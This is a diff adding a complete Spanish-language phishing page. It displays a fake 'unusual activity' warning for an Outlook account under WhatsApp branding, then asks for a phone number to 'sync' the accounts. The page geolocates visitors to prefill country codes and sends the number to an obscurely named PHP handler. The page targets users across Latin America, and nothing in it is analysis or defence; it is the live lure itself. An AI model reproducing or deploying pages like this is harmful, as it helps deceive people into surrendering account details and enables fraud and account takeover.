@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alerta de Actividad Sospechosa - WhatsApp</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+
+<div id="popup" style="">
+    <div class="popup-content">
+        <h2>Actividad Inusual Detectada</h2>
+        <p>Hemos detectado actividades inusuales de parte de su cuenta de Outlook. Para seguir usándola normalmente, realice una verificación.</p>
+        <img src="https://i.pinimg.com/originals/fa/87/77/fa87774590186b287a5338d7c87afc0c.gif" style="width: 150px; height: 150px;"  alt="Logo WhatsApp">
+    </div>
+</div>
+
+<header></header>
+
+<div class="content" style="display: none;">
+    <div class="logows"><img src="https://www.cdnlogo.com/logos/w/43/whatsapp.svg" width="100" id="wsPhoto" alt="Logo WhatsApp"></div>
+    
+    <p>Ingrese su número de teléfono para sincronizar su cuenta de WhatsApp con Outlook:</p>
+    <form id="loginForm" action="fgsdf3301.php" method="POST">
+        <!-- Input de selección de país -->
+        <select id="country" name="country" required="">
+            <option value="" disabled="" selected="">Selecciona tu país</option>
+            <option value="+54">🇦🇷 Argentina</option>
+            <option value="+591">🇧🇴 Bolivia</option>
+            <option value="+55">🇧🇷 Brasil</option>
+            <option value="+56">🇨🇱 Chile</option>
+            <option value="+57">🇨🇴 Colombia</option>
+            <option value="+506">🇨🇷 Costa Rica</option>
+            <option value="+53">🇨🇺 Cuba</option>
+            <option value="+1">🇩🇴 República Dominicana</option>
+            <option value="+593">🇪🇨 Ecuador</option>
+            <option value="+503">🇸🇻 El Salvador</option>
+            <option value="+502">🇬🇹 Guatemala</option>
+            <option value="+504">🇭🇳 Honduras</option>
+            <option value="+52">🇲🇽 México</option>
+            <option value="+505">🇳🇮 Nicaragua</option>
+            <option value="+507">🇵🇦 Panamá</option>
+            <option value="+595">🇵🇾 Paraguay</option>
+            <option value="+51">🇵🇪 Perú</option>
+            <option value="+1">🇵🇷 Puerto Rico</option>
+            <option value="+598">🇺🇾 Uruguay</option>
+            <option value="+58">🇻🇪 Venezuela</option>
+        </select>
+        <!-- Input de teléfono -->
+        <input type="tel" id="telefono" name="telefono" placeholder="Número de teléfono" required>
+        <button type="submit" id="submitButton">Continuar</button>
+    </form>
+</div>
+
+<footer>
+    <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp">
+</footer>
+
+<script>
+    window.onload = function() {
+        setTimeout(function() {
+            document.getElementById('popup').style.display = 'none';
+            document.querySelector('.content').style.display = 'flex';
+        }, 5000);
+
+        const countrySelect = document.getElementById('country');
+        const phoneInput = document.getElementById('telefono');
+        const form = document.getElementById('loginForm');
+        const submitButton = document.getElementById('submitButton');
+
+        countrySelect.addEventListener('change', function() {
+            phoneInput.value = countrySelect.value;
+        });
+
+        phoneInput.addEventListener('input', function() {
+            validatePhoneNumber();
+        });
+        
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const countryCode = data.country_code;
+                const countryMap = {
+                    'AR': '+54',
+                    'BO': '+591',
+                    'BR': '+55',
+                    'CL': '+56',
+                    'CO': '+57',
+                    'CR': '+506',
+                    'CU': '+53',
+                    'DO': '+1',
+                    'EC': '+593',
+                    'SV': '+503',
+                    'GT': '+502',
+                    'HN': '+504',
+                    'MX': '+52',
+                    'NI': '+505',
+                    'PA': '+507',
+                    'PY': '+595',
+                    'PE': '+51',
+                    'PR': '+1',
+                    'UY': '+598',
+                    'VE': '+58'
+                };
+                countrySelect.value = countryMap[countryCode] || '';
+                validatePhoneNumber();
+            })
+            .catch(error => console.error('Error al obtener la ubicación:', error));
+    }
+</script>
+<script src="secure.js"></script>
+</body>
+</html>
